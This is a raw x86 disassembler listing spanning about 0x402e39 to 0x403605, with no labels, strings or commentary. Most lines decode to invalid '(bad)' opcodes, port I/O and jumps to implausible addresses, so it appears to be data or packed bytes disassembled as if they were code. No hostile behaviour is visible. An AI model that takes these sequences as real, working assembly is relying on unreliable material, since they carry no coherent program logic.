  402e39:	or     DWORD PTR [edi-0x30f61700],ecx
  402e3f:	add    BYTE PTR [ecx],ch
  402e41:	(bad)  
  402e42:	idiv   esi
  402e44:	cli    
  402e45:	push   0xffffffac
  402e47:	add    cl,ch
  402e49:	jmp    0xea292ebc
  402e4e:	scas   al,BYTE PTR es:[edi]
  402e4f:	add    cl,ch
  402e51:	fsub   DWORD PTR [esi]
  402e53:	add    al,bl
  402e55:	push   0xffffffe8
  402e57:	add    cl,ch
  402e59:	leave  
  402e5a:	jle    0x402e5c
  402e5c:	jmp    0xe940ed2a
  402e61:	add    BYTE PTR [eax-0x4616ffba],bh
  402e67:	fiadd  WORD PTR [eax]
  402e69:	jmp    0xe9408d17
  402e6e:	test   eax,0x98e9009e
  402e73:	push   es
  402e74:	add    cl,bl
  402e76:	push   0xffffffe2
  402e78:	add    cl,ch
  402e7a:	mov    DWORD PTR [esi-0x29761700],edx
  402e80:	add    cl,ch
  402e82:	js     0x402eda
  402e84:	add    ch,bh
  402e86:	push   0x7c
  402e88:	add    cl,ch
  402e8a:	imul   esi,DWORD PTR [esi+0x0],0x3df37b00
  402e91:	add    BYTE PTR [ebx-0xc],cl
  402e94:	fld    QWORD PTR [eax]
  402e96:	cmp    edx,esp
  402e98:	sbb    eax,DWORD PTR [eax]
  402e9a:	cmp    esi,ebx
  402e9c:	ins    DWORD PTR es:[edi],dx
  402e9d:	add    BYTE PTR [ebx],bh
  402e9f:	repz sub eax,0xbdf64b00
  402ea5:	add    BYTE PTR [ebx-0xd],cl
  402ea8:	or     eax,0x8df33b00
  402ead:	add    BYTE PTR [ebx],bh
  402eaf:	repz dec ebp
  402eb1:	add    BYTE PTR [ebx],cl
  402eb3:	idiv   ch
  402eb5:	add    BYTE PTR [ebx],bh
  402eb7:	loop   0x402eba
  402eb9:	add    BYTE PTR [edx+eiz*8],dh
  402ebc:	add    DWORD PTR [ecx],eax
  402ebe:	or     dl,ah
  402ec0:	adc    DWORD PTR [eax],eax
  402ec2:	pusha  
  402ec3:	loopne 0x402ec6
  402ec5:	adc    BYTE PTR [eax],al
  402ec7:	cli    
  402ec8:	loope  0x402ecf
  402eca:	add    dl,dh
  402ecc:	loope  0x402ecf
  402ece:	add    al,0x6
  402ed0:	loop   0x402f13
  402ed2:	add    BYTE PTR [esi-0x44bffe1f],bh
  402ed8:	loope  0x402edd
  402eda:	add    BYTE PTR [ebx-0x38fdfe1f],dh
  402ee0:	loope  0x402f03
  402ee2:	add    BYTE PTR [edi-0x46dffe1f],bh
  402ee8:	loope  0x402ef3
  402eea:	add    BYTE PTR [ecx-0x7af7fe1f],dh
  402ef0:	loope  0x402e73
  402ef2:	add    bl,cl
  402ef4:	loope  0x402ef6
  402ef6:	add    BYTE PTR [ebx-0x4bfffd1f],bh
  402efc:	loope  0x402e7f
  402efe:	add    DWORD PTR [eax+0x600019e1],ecx
  402f04:	loopne 0x402f07
  402f06:	sbb    BYTE PTR [edx-0xf],ah
  402f09:	pop    es
  402f0a:	pop    es
  402f0b:	(bad)  
  402f0c:	jmp    0x159c3018
  402f11:	or     BYTE PTR [ecx+0x62],ah
  402f14:	adc    eax,0x10c20108
  402f19:	or     BYTE PTR [edx+eiz*2],al
  402f1c:	or     BYTE PTR [eax],cl
  402f1e:	add    DWORD PTR [ecx-0xc],esp
  402f21:	pop    es
  402f22:	xor    DWORD PTR [edx-0xc],esp
  402f25:	pop    es
  402f26:	add    DWORD PTR [edx-0xe],esi
  402f29:	pop    es
  402f2a:	or     eax,0x7ea6200
  402f2f:	add    DWORD PTR [esi+0x16],edx
  402f32:	or     cl,al
  402f34:	(bad)  
  402f35:	ror    BYTE PTR [ecx],0x0
  402f38:	bound  edx,QWORD PTR [eax]
  402f3a:	add    edx,DWORD PTR [ecx]
  402f3c:	bound  edx,QWORD PTR [edx]
  402f3e:	add    eax,DWORD PTR [eax]
  402f40:	(bad)  
  402f41:	call   0xe9a23648
  402f46:	add    al,BYTE PTR [esi]
  402f48:	(bad)  
  402f49:	cli    
  402f4a:	add    al,BYTE PTR ds:0x402fb62
  402f50:	(bad)  
  402f51:	in     al,dx
  402f52:	add    al,BYTE PTR [ebx]
  402f54:	bound  eax,QWORD PTR ds:0xfe620203
  402f5a:	add    al,BYTE PTR [ecx]
  402f5c:	bound  edx,QWORD PTR [edi]
  402f5e:	add    eax,DWORD PTR [eax]
  402f60:	bound  eax,QWORD PTR [eax]
  402f62:	add    eax,DWORD PTR [eax]
  402f64:	bound  ebp,QWORD PTR [esi+0x13]
  402f67:	pop    es
  402f68:	sub    eax,0xbc0e65dc
  402f6d:	dec    ecx
  402f6e:	xor    al,0x9
  402f70:	retf   
  402f71:	clc    
  402f72:	(bad)  
  402f73:	ins    DWORD PTR es:[edi],dx
  402f74:	gs xchg edi,edx
  402f77:	push   0x12
  402f79:	cmc    
  402f7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f7b:	arpl   WORD PTR [ebx+0x62],di
  402f7e:	js     0x402fe4
  402f80:	in     al,0xd8
  402f82:	fstp   TBYTE PTR [ebx-0x67]
  402f85:	out    0x45,al
  402f87:	mov    edx,DWORD PTR [esi-0x68230891]
  402f8d:	clc    
  402f8e:	pusha  
  402f8f:	lods   al,BYTE PTR ds:[esi]
  402f90:	add    BYTE PTR [eax+0x143fd24d],dl
  402f96:	jecxz  0x402fd4
  402f98:	dec    edi
  402f99:	adc    esi,DWORD PTR [esi+ebp*8+0x20]
  402f9d:	or     bh,ch
  402f9f:	push   edi
  402fa0:	lock add al,0x4a
  402fa3:	dec    ebp
  402fa4:	hlt    
  402fa5:	hlt    
  402fa6:	(bad)  
  402fa7:	(bad)  [edx+esi*8]
  402faa:	jg     0x402fcd
  402fac:	push   ebx
  402fad:	jmp    0x402f97
  402faf:	scas   al,BYTE PTR es:[edi]
  402fb0:	inc    ebx
  402fb1:	in     al,0x5d
  402fb3:	inc    esp
  402fb4:	mov    eax,0xe8d2d038
  402fb9:	aaa    
  402fba:	xchg   DWORD PTR [eax],ebx
  402fbc:	xchg   edi,eax
  402fbd:	ss out dx,al
  402fbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fc0:	xchg   DWORD PTR [ecx],esi
  402fc2:	pop    ecx
  402fc3:	aas    
  402fc4:	ins    BYTE PTR es:[edi],dx
  402fc5:	mov    cs,eax
  402fc7:	test   eax,0x137d899c
  402fcc:	retf   
  402fcd:	xor    dh,0x7c
  402fd0:	mov    ebx,0x30365f7f
  402fd5:	arpl   bp,cx
  402fd7:	mov    al,ds:0xa785c60
  402fdc:	minps  xmm5,xmm7
  402fdf:	jae    0x402fe0
  402fe1:	pop    ebp
  402fe2:	xor    WORD PTR [esp+ecx*2],sp
  402fe6:	mov    al,0xbf
  402fe8:	repz dec edx
  402fea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402feb:	dec    ebp
  402fec:	inc    ebx
  402fed:	inc    edx
  402fee:	push   cs
  402fef:	fist   DWORD PTR [edx+0x3d]
  402ff2:	aaa    
  402ff3:	sbb    al,ch
  402ff5:	add    BYTE PTR [ecx-0x4b],ah
  402ff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ff9:	mov    bh,0x5e
  402ffb:	mov    al,ds:0xe6e53400
  403000:	rol    dl,cl
  403002:	in     al,dx
  403003:	fbld   TBYTE PTR [ebp+0x352ede23]
  403009:	lea    ecx,[ecx]
  40300b:	daa    
  40300c:	inc    edx
  40300d:	aas    
  40300e:	test   eax,0x98a9db30
  403013:	xor    eax,0x11c20aac
  403018:	xor    dh,BYTE PTR [ebp+eax*4+0x14]
  40301c:	inc    ebp
  40301d:	es dec ebp
  40301f:	push   cs
  403020:	fcom   QWORD PTR [eax-0x6a54f5ac]
  403026:	push   ecx
  403027:	adc    ah,BYTE PTR [esi]
  403029:	and    ebx,DWORD PTR [esi+0x13]
  40302c:	push   ecx
  40302d:	imul   esi,DWORD PTR [eax+0xc],0x9c0f7c8
  403034:	mov    edi,0x212d357c
  403039:	or     ch,BYTE PTR [edx]
  40303b:	sub    BYTE PTR [esi+0x50],dl
  40303e:	xchg   esp,eax
  40303f:	das    
  403040:	iret   
  403041:	fidivr WORD PTR [ebp+esi*1-0x29167848]
  403048:	sub    cl,dh
  40304a:	jns    0x40302a
  40304c:	pop    edi
  40304d:	pop    ebx
  40304e:	mov    eax,0x8c5c6e4
  403053:	loopne 0x403006
  403055:	outs   dx,BYTE PTR ds:[esi]
  403056:	sub    eax,0xd82f84
  40305b:	xchg   ebp,eax
  40305c:	sbb    DWORD PTR [eax+0x42],0xacc178bc
  403063:	fs jnp 0x40301c
  403066:	jns    0x403088
  403068:	adc    eax,0x1010e776
  40306d:	add    DWORD PTR [ebp+0x3980781],edx
  403073:	scas   al,BYTE PTR es:[edi]
  403074:	or     al,0xef
  403076:	add    BYTE PTR [edx],dl
  403078:	pop    ebx
  403079:	mov    cl,0x71
  40307b:	mov    ah,0x4a
  40307d:	mov    dh,0x6
  40307f:	fdivp  st(3),st
  403081:	mov    esi,0xb82b889f
  403086:	call   0x78475fb4
  40308b:	(bad)  
  40308c:	push   ds
  40308d:	add    BYTE PTR [edi],cl
  40308f:	add    eax,0x73960950
  403094:	jg     0x4030a4
  403096:	loope  0x403038
  403098:	repz push 0x6de4267f
  40309e:	or     BYTE PTR [edx+edx*4-0x3cc56e9c],ch
  4030a5:	arpl   si,sp
  4030a7:	pop    ds
  4030a8:	lods   eax,DWORD PTR ds:[esi]
  4030a9:	imul   ebp,DWORD PTR [ebx-0x57],0x7c
  4030ad:	ins    BYTE PTR es:[edi],dx
  4030ae:	sbb    al,0xf3
  4030b0:	int    0x65
  4030b2:	test   DWORD PTR [ebp-0x23],eax
  4030b5:	(bad)
  4030ba:	ins    BYTE PTR es:[edi],dx
  4030bb:	mov    al,ds:0x1b0138
  4030c0:	mov    edx,0x6c820809
  4030c5:	sbb    DWORD PTR [edi],ecx
  4030c7:	cmc    
  4030c8:	int    0x44
  4030ca:	mov    al,0x65
  4030cc:	cmp    edx,DWORD PTR [edi+esi*4]
  4030cf:	adc    ah,cl
  4030d1:	gs mov esi,0xb975578b
  4030d7:	cld    
  4030d8:	add    al,0x1
  4030da:	fsub   QWORD PTR [edx-0x6e]
  4030dd:	rcr    dl,1
  4030df:	adc    eax,0x8cd3a148
  4030e4:	pop    esi
  4030e5:	mov    cl,0xd4
  4030e7:	sti    
  4030e8:	mov    ds:0x854db27d,eax
  4030ed:	lods   al,BYTE PTR ds:[esi]
  4030ee:	mov    ch,0x3a
  4030f0:	bound  edx,QWORD PTR [ebx+eax*1]
  4030f3:	mov    esp,0xbb149f01
  4030f8:	mov    dh,0x41
  4030fa:	mov    al,ds:0x71cb28df
  4030ff:	fmul   DWORD PTR [edi+0x1d]
  403102:	mov    edi,0xd0a7bed1
  403107:	(bad)  
  403108:	xchg   ecx,eax
  403109:	inc    esi
  40310a:	fsubr  QWORD PTR [ecx+0x21]
  40310d:	aam    0xad
  40310f:	outs   dx,BYTE PTR ds:[esi]
  403110:	ss inc edx
  403112:	jnp    0x40317b
  403114:	mov    bh,0xb0
  403116:	mov    WORD PTR [eax+0x38],fs
  403119:	outs   dx,DWORD PTR ds:[esi]
  40311a:	sbb    BYTE PTR [esi+ebx*4],al
  40311d:	fucomp st(1)
  40311f:	add    dl,BYTE PTR [ecx+0xa374b]
  403125:	clc    
  403126:	mov    eax,0xbc1f0d48
  40312b:	push   ebp
  40312c:	add    eax,0x2444692
  403131:	test   eax,esi
  403133:	repnz or ah,ah
  403136:	jns    0x40315b
  403138:	or     al,0x2b
  40313a:	in     eax,0x91
  40313c:	push   0x6f806fad
  403141:	inc    edx
  403142:	stc    
  403143:	scas   al,BYTE PTR es:[edi]
  403144:	retfw  
  403146:	mov    ds:0xea2c61df,al
  40314b:	retf   
  40314c:	ficom  WORD PTR [eax+ebx*2+0x1e3bd9bc]
  403153:	imul   edx,eax,0xffffffb2
  403156:	mov    ebx,DWORD PTR [ebx+0x812a5d7]
  40315c:	mov    bl,0x3b
  40315e:	cmp    eax,0x27277cb3
  403164:	mov    ebp,0xba57b50d
  403169:	mov    ds:0xfa8709d8,al
  40316e:	add    edx,DWORD PTR [edi-0x1ab1126a]
  403174:	in     eax,0xec
  403176:	aad    0x73
  403178:	mov    ch,0xd3
  40317a:	ins    BYTE PTR es:[edi],dx
  40317b:	add    BYTE PTR [ebx-0x51],al
  40317e:	dec    BYTE PTR [ebp-0x23ac4fae]
  403184:	and    DWORD PTR [ecx+0xf16adc],ebp
  40318a:	cdq    
  40318b:	gs sti 
  40318d:	inc    BYTE PTR [eax]
  40318f:	mul    BYTE PTR [esi+ecx*1+0x6]
  403193:	dec    ebp
  403194:	xlat   BYTE PTR ds:[ebx]
  403195:	pop    ebp
  403196:	mul    ebx
  403198:	inc    ecx
  403199:	sub    eax,0xbaf273c8
  40319e:	fs cmc 
  4031a0:	pop    ebx
  4031a1:	retf   0x4c5b
  4031a4:	into   
  4031a5:	cdq    
  4031a6:	(bad)  
  4031a8:	cmp    BYTE PTR [ecx+0x65],ch
  4031ab:	outs   dx,BYTE PTR ds:[esi]
  4031ac:	sub    eax,0xbae96575
  4031b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031b2:	pop    edx
  4031b3:	pop    eax
  4031b4:	inc    ecx
  4031b5:	(bad)  
  4031b6:	arpl   di,cx
  4031b8:	iret   
  4031b9:	(bad)  
  4031ba:	and    BYTE PTR fs:[ecx+esi*1],0x80
  4031bf:	call   0x59c79375
  4031c4:	cmp    BYTE PTR [edx],dl
  4031c6:	jbe    0x40319a
  4031c8:	mov    BYTE PTR [edx],0x89
  4031cb:	jg     0x4031ec
  4031cd:	in     eax,dx
  4031ce:	adc    eax,esi
  4031d0:	mov    BYTE PTR ds:0x4e336311,bl
  4031d6:	or     dl,cl
  4031d8:	popf   
  4031d9:	ds mov edi,0x1ba91678
  4031df:	repz jg 0x4031bb
  4031e2:	or     al,0x60
  4031e4:	add    BYTE PTR [edx],ch
  4031e6:	fsubr  DWORD PTR [eax]
  4031e8:	pop    ss
  4031e9:	xchg   esp,eax
  4031ea:	cmp    BYTE PTR [ecx],ch
  4031ec:	pusha  
  4031ed:	push   ecx
  4031ee:	add    bh,bh
  4031f0:	pop    es
  4031f1:	(bad)  
  4031f2:	fbstp  TBYTE PTR [esi]
  4031f4:	or     ah,BYTE PTR [ecx+0x38119c2d]
  4031fa:	mov    ebx,0x384f10b7
  4031ff:	add    esi,DWORD PTR [ecx+edx*8]
  403202:	(bad)  
  403203:	push   edx
  403204:	sub    eax,0x266014a6
  403209:	aas    
  40320a:	mov    ds:0x43482b53,al
  40320f:	push   edi
  403210:	(bad)  
  403212:	lods   eax,DWORD PTR ds:[esi]
  403213:	jle    0x4031f7
  403215:	scas   eax,DWORD PTR es:[edi]
  403216:	pop    ds
  403217:	and    al,0xdc
  403219:	mov    DWORD PTR ss:[edi+0x3b2a41d5],ebp
  403220:	jns    0x403201
  403222:	xchg   esp,eax
  403223:	cli    
  403224:	ja     0x4031ce
  403226:	push   es
  403227:	enter  0x317f,0x70
  40322b:	jmp    0x4031ae
  40322d:	inc    esi
  40322e:	jne    0x4031fe
  403230:	jns    0x4031fd
  403232:	add    esp,edi
  403234:	jbe    0x4031f2
  403236:	mov    edi,ebp
  403238:	jg     0x40325f
  40323a:	pop    ss
  40323b:	add    al,0x81
  40323d:	push   edx
  40323e:	pop    esp
  40323f:	mov    dl,0xdd
  403241:	int3   
  403242:	jmp    0xda13:0x70bbe4a2
  403249:	and    bh,dh
  40324b:	inc    ebx
  40324c:	(bad)  
  40324d:	push   ebp
  40324e:	addr16 xor ax,bp
  403252:	rol    DWORD PTR [eax],1
  403254:	out    dx,al
  403255:	sub    al,0xb2
  403257:	jnp    0x403290
  403259:	and    eax,0x2c3fe52b
  40325e:	pop    esp
  40325f:	add    BYTE PTR [ecx+eiz*1],ah
  403262:	xlat   BYTE PTR ds:[ebx]
  403263:	ret    0x310a
  403266:	shl    BYTE PTR [ebp+0x2cd98240],1
  40326c:	scas   al,BYTE PTR es:[edi]
  40326d:	push   ecx
  40326e:	ficomp WORD PTR [ebx-0x25]
  403271:	adc    eax,0x7659b64
  403276:	arpl   sp,bp
  403278:	das    
  403279:	xor    eax,0x6481756a
  40327e:	ins    DWORD PTR es:[edi],dx
  40327f:	add    dh,dl
  403281:	(bad)  [ecx]
  403283:	pushf  
  403284:	mov    ecx,cs
  403286:	push   cs
  403287:	jmp    0x40327f
  403289:	js     0x403292
  40328b:	jb     0x403225
  40328d:	test   al,0x0
  40328f:	add    eax,0x95bfae09
  403294:	ja     0x403233
  403296:	mov    eax,0xb1cd1de2
  40329b:	jnp    0x4032d0
  40329d:	(bad)  
  40329e:	mov    ah,0xc
  4032a0:	shl    BYTE PTR [eax-0x2e],0x92
  4032a4:	ds popa 
  4032a6:	aad    0xe5
  4032a8:	test   BYTE PTR [ecx],dl
  4032aa:	fdivr  QWORD PTR [edx+ebp*1+0x42]
  4032ae:	fisttp DWORD PTR [ebx]
  4032b0:	imul   DWORD PTR [ebx]
  4032b2:	rol    DWORD PTR [esi-0xe2c0487],cl
  4032b8:	add    BYTE PTR [ebx],dl
  4032ba:	dec    ebx
  4032bb:	(bad)  [eax+0x5d]
  4032be:	pop    edx
  4032bf:	ficomp DWORD PTR [edi]
  4032c1:	into   
  4032c2:	(bad)  
  4032c3:	mov    esp,0xb9cf4081
  4032c8:	neg    BYTE PTR [edx]
  4032ca:	lahf   
  4032cb:	mov    al,0x6f
  4032cd:	xor    al,0xae
  4032cf:	mov    bh,0x18
  4032d1:	in     eax,0xc3
  4032d3:	or     BYTE PTR [eax-0xf06cb5],cl
  4032d9:	bound  edi,QWORD PTR [edx]
  4032db:	or     eax,DWORD PTR [esi]
  4032dd:	inc    esp
  4032de:	mov    esp,0x577300fb
  4032e3:	data16 gs (bad) 
  4032e7:	xchg   esi,eax
  4032e8:	(bad)  
  4032e9:	retf   0xc753
  4032ec:	imul   eax,DWORD PTR [ebx-0x4b],0xffffffb7
  4032f0:	ins    BYTE PTR es:[edi],dx
  4032f1:	dec    esp
  4032f2:	clc    
  4032f3:	loopne 0x4032ff
  4032f5:	add    bl,BYTE PTR [edi+0x2c8d0db2]
  4032fb:	add    BYTE PTR [esp+ebp*1],0xc2
  4032ff:	xchg   ebx,eax
  403300:	add    ebx,DWORD PTR [ebx+0x21]
  403303:	sbb    eax,0xeea7c567
  403308:	pop    edi
  403309:	mov    dl,0x35
  40330b:	imul   ebp,DWORD PTR ds:[ebx],0x346e4fcb
  403312:	sub    bl,BYTE PTR [ecx-0x2f]
  403315:	mov    esp,0x8bd62aac
  40331a:	pop    esi
  40331b:	cli    
  40331c:	fiadd  WORD PTR [eax]
  40331e:	mov    ds:0x8dd80bd0,al
  403323:	push   ebx
  403324:	xchg   ebp,eax
  403325:	mov    esp,0xbb66b4fb
  40332a:	and    al,0x67
  40332c:	mov    dh,0xb2
  40332e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40332f:	fld    st(7)
  403331:	mov    ch,0x72
  403333:	aam    0xd2
  403335:	mov    ebp,0xbac169ef
  40333a:	sbb    al,dl
  40333c:	jae    0x4032f1
  40333e:	mov    cl,0x56
  403340:	mov    ds:0xcfd3eb4,al
  403345:	ror    al,1
  403347:	xchg   edx,eax
  403348:	std    
  403349:	(bad)  
  40334a:	pop    ss
  40334b:	fldcw  WORD PTR [edi]
  40334d:	ficom  WORD PTR [esi+0x41d95e7f]
  403353:	(bad)  
  403355:	dec    ecx
  403356:	test   BYTE PTR [edx],ch
  403358:	popa   
  403359:	cmp    DWORD PTR [ebx+0x45eaeb15],eax
  40335f:	mov    WORD PTR [ebp+0x1a],?
  403362:	inc    ebp
  403363:	ret    
  403364:	mov    esi,0x48255985
  403369:	jne    0x4033c1
  40336b:	sbb    dl,dl
  40336d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40336e:	addr16 xchg ebx,eax
  403370:	pop    esp
  403371:	(bad)  
  403372:	pusha  
  403373:	mov    esp,0xd96203e9
  403378:	test   al,0x14
  40337a:	dec    ecx
  40337b:	shr    BYTE PTR [ebx+0x61],1
  40337e:	push   esp
  40337f:	stos   DWORD PTR es:[edi],eax
  403380:	sub    dh,BYTE PTR [edx]
  403382:	add    BYTE PTR [edi-0x3e],al
  403385:	in     eax,dx
  403386:	sar    dh,0x74
  403389:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40338a:	iret   
  40338b:	or     eax,0x189e6f6c
  403390:	xchg   DWORD PTR [esi],esp
  403392:	ins    DWORD PTR es:[edi],dx
  403393:	and    ebx,DWORD PTR [esi+0x208b79f1]
  403399:	mov    al,0x8a
  40339b:	mov    al,ds:0x4ddb6307
  4033a0:	lock and DWORD PTR [esi+ecx*2+0x1736f4f9],ebp
  4033a8:	lods   al,BYTE PTR ds:[esi]
  4033aa:	inc    ebp
  4033ab:	hlt    
  4033ac:	es addr16 sbb cl,ah
  4033b0:	dec    ebx
  4033b1:	push   ds
  4033b2:	out    0xcd,eax
  4033b4:	push   esp
  4033b5:	cmp    dl,dh
  4033b7:	and    esp,DWORD PTR [eax-0x76f4df07]
  4033bd:	mov    edx,0x7b721654
  4033c2:	inc    ebx
  4033c3:	add    eax,0xbcad1c7b
  4033c8:	mov    ebx,0xa4cfddd5
  4033cd:	add    BYTE PTR [esi+0x571c51ed],bl
  4033d3:	loop   0x40342d
  4033d5:	add    eax,0x82d07e40
  4033da:	add    ecx,ecx
  4033dc:	fstp   DWORD PTR [ebx-0x4f41574e]
  4033e2:	jae    0x4033ff
  4033e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033e5:	test   eax,0x64850024
  4033ea:	out    0xdd,al
  4033ec:	sub    eax,0x6796ff7d
  4033f1:	call   0x8bcd:0x92ac4fd4
  4033f8:	adc    BYTE PTR [ebp-0x6b],0x4a
  4033fc:	mov    ch,0x4b
  4033fe:	mov    WORD PTR [ecx],cs
  403400:	pop    esp
  403401:	daa    
  403402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403403:	enter  0x4226,0xbe
  403407:	pop    DWORD PTR [ecx-0x31b90eff]
  40340d:	call   0xc2341f9
  403412:	ret    
  403413:	(bad)  
  403414:	rcl    DWORD PTR [esi],cl
  403416:	ficom  DWORD PTR [ebx-0x2c]
  403419:	mov    ds,WORD PTR [ebp+0x12]
  40341c:	call   DWORD PTR [edx-0x7fea3ebc]
  403422:	outs   dx,DWORD PTR ds:[esi]
  403423:	sbb    BYTE PTR [ecx+ebp*2],0x76
  403427:	push   edi
  403428:	stos   DWORD PTR es:[edi],eax
  403429:	stos   BYTE PTR es:[edi],al
  40342a:	cmp    DWORD PTR [esi],ecx
  40342c:	js     0x4033ed
  40342e:	and    ch,al
  403430:	cmp    bl,dl
  403432:	or     edi,DWORD PTR [ecx+ebp*2-0x33]
  403436:	adc    bl,dl
  403438:	pop    edi
  403439:	xchg   ebx,eax
  40343a:	fistp  WORD PTR [ebx+0x58c68d26]
  403440:	push   edx
  403441:	imul   ebp,ebp,0xf480b519
  403447:	add    ah,cl
  403449:	or     BYTE PTR [edx],ch
  40344b:	mov    ebx,0x311a8d00
  403450:	mov    ds:0x891c683e,al
  403455:	out    dx,eax
  403456:	aaa    
  403457:	pop    es
  403458:	nop
  403459:	rcl    BYTE PTR [ebx-0x61],0x17
  40345d:	and    DWORD PTR [ebx-0x7c],0xa933720e
  403464:	and    eax,0x3cb204b3
  403469:	in     al,0x9e
  40346b:	repz jae 0x4033f3
  40346e:	mov    al,0xe8
  403470:	push   0xffffffb6
  403472:	add    ah,al
  403474:	inc    ecx
  403475:	pop    es
  403476:	rcr    dh,cl
  403478:	pop    eax
  403479:	mov    esi,0xfff079a4
  40347e:	xchg   ebp,eax
  40347f:	(bad)  
  403480:	jmp    0xc28ff791
  403485:	cmp    eax,0x7adb52f4
  40348a:	jno    0x4034a1
  40348c:	xchg   esp,eax
  40348d:	mov    ebx,0x88d0e60
  403492:	adc    BYTE PTR [ebx],ah
  403494:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403495:	dec    ecx
  403496:	aas    
  403497:	cmp    BYTE PTR [edi+0x38a02a76],bh
  40349d:	mov    bh,0x1b
  40349f:	mov    ebx,0x964dc421
  4034a4:	or     dh,BYTE PTR [ebp+0x7c]
  4034a7:	lea    edx,[ebx]
  4034a9:	push   edx
  4034aa:	xlat   BYTE PTR ds:[ebx]
  4034ab:	int3   
  4034ac:	pop    esp
  4034ad:	adc    ecx,eax
  4034af:	xlat   BYTE PTR ds:[ebx]
  4034b0:	inc    ebp
  4034b1:	add    al,al
  4034b3:	js     0x4034af
  4034b5:	outs   dx,BYTE PTR ds:[esi]
  4034b6:	sub    DWORD PTR [ecx+0x786f77e1],0xbb2ebabb
  4034c0:	mov    al,ds:0x32a62a3
  4034c5:	(bad)  
  4034c6:	jmp    0x9cd0:0xf3961263
  4034cd:	xlat   BYTE PTR ds:[ebx]
  4034ce:	and    al,0x12
  4034d0:	ins    BYTE PTR es:[edi],dx
  4034d1:	int3   
  4034d2:	and    eax,0x6e1be4f
  4034d7:	nop
  4034d8:	iret   
  4034d9:	cli    
  4034da:	not    DWORD PTR [ebx+ebx*8-0x57128f9e]
  4034e1:	jns    0x40352c
  4034e3:	and    bh,BYTE PTR [ecx+0x54]
  4034e6:	and    bh,BYTE PTR [ebx-0x78]
  4034e9:	dec    edi
  4034ea:	sub    edi,DWORD PTR [eax-0x693f1ea]
  4034f0:	in     eax,0x14
  4034f2:	ins    DWORD PTR es:[edi],dx
  4034f3:	inc    esi
  4034f4:	xor    al,0x38
  4034f6:	jle    0x40347f
  4034f8:	inc    ebp
  4034f9:	and    ebp,DWORD PTR [edi+0x5b]
  4034fc:	das    
  4034fd:	std    
  4034fe:	aas    
  4034ff:	xchg   edx,eax
  403500:	pop    esi
  403501:	out    0x1e,al
  403503:	fisttp QWORD PTR ds:0xfb142dcb
  403509:	iret   
  40350a:	sbb    al,0x5f
  40350c:	jb     0x40349f
  40350e:	arpl   WORD PTR [esi-0x1ea5755d],bx
  403514:	shl    BYTE PTR [edi-0x3fdfcf00],1
  40351a:	mov    esp,0x24a58338
  40351f:	mov    bh,0xda
  403521:	aam    0x3f
  403523:	push   ss
  403524:	adc    eax,0x6bf51286
  403529:	jne    0x403534
  40352b:	in     al,0x86
  40352d:	call   0x1a065079
  403532:	push   ebx
  403533:	adc    bl,BYTE PTR [ecx]
  403535:	dec    ecx
  403536:	jle    0x403571
  403538:	pop    eax
  403539:	cmp    ah,BYTE PTR [ebp+0x40]
  40353c:	(bad)  
  40353e:	cmp    al,0x65
  403540:	mov    edx,0xa3464b96
  403545:	pop    ebp
  403546:	pop    ds
  403547:	imul   ecx,esp,0x14
  40354a:	out    dx,al
  40354b:	jae    0x403522
  40354d:	mov    ebx,0x7a9eb17f
  403552:	nop
  403553:	stos   BYTE PTR es:[edi],al
  403554:	xchg   DWORD PTR [ecx],edi
  403556:	loop   0x4035d7
  403558:	jo     0x403552
  40355a:	mov    dl,0x6c
  40355c:	jns    0x403505
  40355e:	mov    dh,0xfc
  403560:	icebp  
  403561:	pop    ebp
  403562:	(bad)
  403565:	adc    al,0x95
  403567:	mov    dl,0x3
  403569:	int3   
  40356a:	arpl   WORD PTR [ecx-0x24067ce4],bx
  403570:	push   ebp
  403571:	inc    edx
  403572:	or     dl,bl
  403574:	dec    esi
  403575:	icebp  
  403576:	push   edi
  403577:	mul    BYTE PTR [edi]
  403579:	mov    al,0x28
  40357b:	add    BYTE PTR ds:0xe19bb241,al
  403581:	lods   eax,DWORD PTR ds:[esi]
  403582:	rep ins BYTE PTR es:[edi],dx
  403584:	cli    
  403585:	mov    dh,0x20
  403587:	mov    ebp,0xce61dfcf
  40358c:	mov    esp,0x7560b6c8
  403591:	mov    edi,ebp
  403593:	das    
  403594:	jbe    0x403528
  403596:	and    al,0x2
  403598:	fwait
  403599:	jnp    0x4035f8
  40359b:	adc    DWORD PTR [eax+0x815aa64],esp
  4035a1:	out    0xea,al
  4035a3:	out    0xa2,al
  4035a5:	repz daa 
  4035a7:	xor    eax,esi
  4035a9:	sbb    ch,BYTE PTR [ecx+0x44]
  4035ac:	aad    0x1
  4035ae:	scas   al,BYTE PTR es:[edi]
  4035af:	fimul  DWORD PTR [eax+edx*2+0x578fa9e7]
  4035b6:	add    BYTE PTR [edx+edi*4],ch
  4035b9:	fldenv [ebp-0x433b1a9b]
  4035bf:	add    edx,esp
  4035c1:	call   0x7168:0x839f4271
  4035c8:	(bad)  
  4035c9:	jo     0x40360e
  4035cb:	mov    al,0x29
  4035cd:	jbe    0x403629
  4035cf:	out    0xb2,eax
  4035d1:	mov    dh,0x15
  4035d3:	push   ds
  4035d4:	mov    al,ds:0x5550caf
  4035d9:	les    esp,FWORD PTR [edi]
  4035db:	mov    WORD PTR [edx-0x27],es
  4035de:	ds sti 
  4035e0:	add    BYTE PTR [ecx+0x41],ah
  4035e3:	mov    ecx,0xa05bd13a
  4035e8:	jns    0x403666
  4035ea:	aaa    
  4035eb:	mov    edi,DWORD PTR [eax-0x206dd1c9]
  4035f1:	pushf  
  4035f2:	in     eax,dx
  4035f3:	fcom   QWORD PTR [esi]
  4035f5:	cli    
  4035f6:	clc    
  4035f7:	ret    
  4035f8:	pop    ebp
  4035f9:	dec    ebx
  4035fa:	sbb    ebp,edi
  4035fc:	xchg   esp,eax
  4035fd:	enter  0xf602,0x50
  403601:	loop   0x4035e3
  403603:	scas   al,BYTE PTR es:[edi]
  403604:	xchg   ecx,eax
  403605:	in     eax,dx
